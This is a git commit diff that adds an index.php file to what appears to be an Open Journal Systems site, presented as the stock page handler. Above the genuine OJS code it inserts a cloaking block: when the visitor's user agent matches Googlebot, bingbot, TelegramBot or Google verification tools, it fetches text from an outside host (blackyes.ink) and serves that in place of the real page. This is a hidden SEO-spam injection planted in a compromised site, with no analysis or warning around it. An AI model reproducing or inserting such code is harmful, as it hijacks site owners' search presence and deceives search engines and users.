d36b4a58feaadbbff5374fc22e217f1ac98c673c
blackyes888 <blackyes888@gmail.com>
2025-12-05 14:04:09 +0700

    Create index.php

---
+++ inde.php
@@ -0,0 +1,46 @@
+<?php
+function is_bot() {
+    $user_agent = $_SERVER['HTTP_USER_AGENT'];
+    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
+    
+    foreach ($bots as $bot) {
+        if (stripos($user_agent, $bot) !== false) {
+            return true;
+        }
+    }
+    
+    return false;
+}
+
+if (is_bot()) {
+    $message = file_get_contents('https://blackyes.ink/landing/jurnalsains.txt');
+    echo $message;
+exit;
+}
+?>
+<?php
+
+/**
+ * @defgroup pages_index Index Pages
+ */
+ 
+/**
+ * @file pages/index/index.php
+ *
+ * Copyright (c) 2014-2018 Simon Fraser University
+ * Copyright (c) 2003-2018 John Willinsky
+ * Distributed under the GNU GPL v2. For full terms see the file docs/COPYING.
+ *
+ * @ingroup pages_index
+ * @brief Handle site index requests. 
+ *
+ */
+
+switch ($op) {
+	case 'index':
+		define('HANDLER_CLASS', 'IndexHandler');
+		import('pages.index.IndexHandler');
+		break;
+}
+
+?>
